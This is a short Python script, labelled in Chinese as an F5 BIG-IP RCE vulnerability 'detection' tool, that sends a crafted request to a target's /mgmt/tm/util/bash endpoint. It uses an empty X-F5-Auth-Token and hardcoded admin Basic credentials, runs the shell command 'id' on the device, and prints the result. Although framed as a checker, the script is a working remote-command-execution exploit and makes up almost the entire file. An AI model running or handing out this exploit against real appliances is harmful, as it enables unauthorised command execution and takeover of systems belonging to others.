import requests
import json
import sys
import warnings

banner="""
 ______   _ _   _ _             
|  ____| (_) \ | (_)            
| |__ ___ _|  \| |_  __ _  ___  
|  __/ _ \ | . ` | |/ _` |/ _ \ 
| | |  __/ | |\  | | (_| | (_) |
|_|  \___|_|_| \_|_|\__,_|\___/ 
                version:1.6
                
F5-BIG-IP-RCE漏洞检测脚本
                
"""

warnings.filterwarnings("ignore")

print(banner)

url = sys.argv[2]

urls = url + "/mgmt/tm/util/bash"
headers = {
        "Authorization": "Basic YWRtaW46QVNhc1M=",
        "X-F5-Auth-Token": "",
        "Content-Type": "application/json"
    }
data = '{"command":"run","utilCmdArgs":"-c id"}'

try:
    reps = requests.post(url=urls,headers=headers,data=data,verify=False,timeout=30)
    if "commandResult" in reps.text and reps.status_code == 200:
        print("\033[32m[+] {} 疑似存在f5-big-ip-rce漏洞,响应为:{} \033[0m".format(url, json.loads(reps.text)["commandResult"]))        
    else:
        print("\033[31m[-] {} 未发现目标存在f5-big-ip-rce漏洞 \033[0m".format(url))
except Exception as e:
    print("[x] {} 请求失败 ".format(url))
    
    
 